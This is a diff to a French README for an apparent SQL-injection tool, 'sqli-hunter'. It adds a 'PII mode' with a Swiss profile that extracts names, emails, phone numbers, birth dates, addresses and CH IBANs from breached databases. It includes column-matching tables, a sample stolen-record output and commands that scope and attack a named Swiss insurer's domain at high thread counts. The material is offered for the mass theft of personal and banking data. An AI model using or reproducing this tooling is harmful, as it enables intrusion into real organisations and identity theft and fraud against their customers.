@@ -43,7 +43,41 @@ Dès qu'une vulnérabilité est détectée, l'outil lance automatiquement l'extr
 | `--threads` | Goroutines de scan | 8 |
 | `--extract-threads` | Workers d'extraction | 2 |
 
-### Données extraites
+### Données extraites (mode PII — profil **Suisse**)
+
+L'extraction cible **uniquement les données utilisateurs à risque**, validées par regex **CH** :
+
+| Champ | Colonnes détectées | Validation |
+|-------|-------------------|------------|
+| Nom / Prénom | `nom`, `nachname`, `vorname`, `prenom`… | lettres, 2–50 car. |
+| Email | `email`, `mail`… | regex email |
+| Téléphone | `tel`, `telefon`, `natel`, `mobile`… | **+41 / 0xx suisse** |
+| Date naissance | `geburtsdatum`, `date_naissance`… | `YYYY-MM-DD` ou `DD.MM.YYYY` |
+| Adresse | `strasse`, `adresse`, `plz`, `npa`, `ort`… | NPA 4 chiffres ou ≥ 8 car. |
+| IBAN | `iban`, `konto`… | **CH** uniquement — optionnel |
+
+Exemple de sortie `.sql` / CLI :
+
+```
+── Utilisateur #1 ──
+nom: Meier
+prenom: Hans
+date_naissance: 1985-03-12
+adresse: Bahnhofstrasse 1, 8001 Zürich
+email: hans.meier@bluewin.ch
+telephone: 0791234567
+iban: CH9300762011623852957   ← uniquement si présent en DB
+```
+
+**Seuil minimum** : email **ou** téléphone suisse valide. IBAN CH extrait si disponible.
+
+```bash
+# Scope assureur suisse
+sqli-hunter discover -d css.ch --preset insurance -o scope.txt
+sqli-hunter -l scope.txt --url-threads 64
+```
+
+### Données extraites (--extract-meta)
 
 - Version DB (`@@version`, `version()`)
 - Nom de la base (`database()`, `current_database()`)
